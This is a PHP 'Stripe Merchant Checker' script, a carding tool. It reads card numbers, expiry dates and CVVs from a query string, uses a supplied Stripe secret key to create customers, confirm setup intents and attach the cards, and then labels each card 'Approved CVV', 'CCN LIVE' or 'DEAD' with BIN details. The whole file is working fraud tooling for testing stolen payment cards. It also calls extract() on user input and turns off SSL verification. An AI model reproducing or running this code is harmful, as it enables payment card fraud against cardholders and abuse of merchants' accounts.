<?php

//////////////////===========[Stripe Merchant Checker by 𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐]===========/////////////////////

error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

function RandomString($length = 23){
$characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString     = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}
function emailGenerate($length = 10){
$characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString     = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString . '@gmail.com';}

$sec1 = $_GET['sec'];
extract($_GET);
$separa = explode("|", $lista);
$cc = $separa[0];
$mon = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else {
$bin = 'Debit';
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false){
return "";}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));}
function mod($dividendo,$divisor){
return round($dividendo - (floor($dividendo/$divisor)*$divisor));}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Zeltrax Rockz');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$id = trim(strip_tags(getstr($f,'"id": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$c = json_decode(curl_exec($ch), true);
curl_close($ch);
$pam = trim(strip_tags(getstr($result,'"payment_method": "','"')));
$cvv = trim(strip_tags(getstr($result,'"cvc_check": "','"')));
if ($c["status"] == "succeeded") {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
curl_setopt($ch, CURLOPT_USERPWD, $k . ':' . '');   
$result = curl_exec($ch);
curl_close($ch);
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
$attachment_to_her = json_decode(curl_exec($ch), true);
curl_close($ch);
$attachment_to_her;

if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass") {
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved CVV[NACHO BC] </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> [CVV MATCHED] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';
}else{
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> Your card was declined. [CVC UNAVAILABLE] </i></font><font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';}
}
elseif(strpos($result, '"cvc_check": "pass"')){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved CVV[NACHO BC]</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CVV Matched] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';
}
elseif(strpos($result, 'security code is incorrect')){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-warning"> [CCN LIVE]</i></font> </i><font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [Insufficient funds.] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';
}
elseif(strpos($result, 'incorrect_cvc')){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CCN LIVE]</i></font> </i></font><font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';
}
elseif(strpos($result, 'Your card does not support this type of purchase.')){
echo '<font size=3.5 color="white"><font class="badge badge-success">#LIVE </i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CVV Matched]</i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';
}
elseif (isset($c["error"])) {
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-warning"> ' . $c["error"] ["message"] . ' ' . $c ["error"]["decline_code"] . ' </i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';
}
else {
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">Gate Closed</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐</font><br>';
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
curl_exec($ch);
curl_close($ch);

//////////////////===========[Stripe Merchant Checker by 𝙃𝙄𝙉𝘿𝙐𝙎𝙏𝘼𝙉𝙄 𝘽𝙃𝘼𝙐]===========/////////////////////